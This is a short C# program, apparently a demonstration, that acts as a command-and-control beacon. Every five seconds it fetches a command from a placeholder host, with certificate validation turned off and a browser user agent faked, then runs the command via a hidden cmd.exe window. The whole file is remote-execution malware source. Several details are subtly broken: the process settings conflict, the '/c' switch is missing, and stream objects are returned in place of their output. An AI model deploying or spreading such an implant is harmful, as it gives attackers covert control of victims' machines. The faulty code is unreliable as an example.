using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;

namespace exposing_demo
{
    class Program
    {
        //define dwell
        static int dwell = 5000;  //5 seconds

        static void Main(string[] args)
        {
            while (true)
            {
                Console.WriteLine(run(new string[] {GetCommand("https://www.malware.yes.local/order")}));
                System.Threading.Thread.Sleep(dwell);
            }
        }

        static string run(string[] args)
        {
            string output = String.Empty;

            Process p = new Process();
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = String.Join(" ", args);
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardOutput = true;

            p.Start();
            output += p.StandardOutput;
            output += p.StandardInput;

            return output;
        }

        static string GetCommand(string site)
        {
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko");
            return wc.DownloadString(site);
        }

    }
}
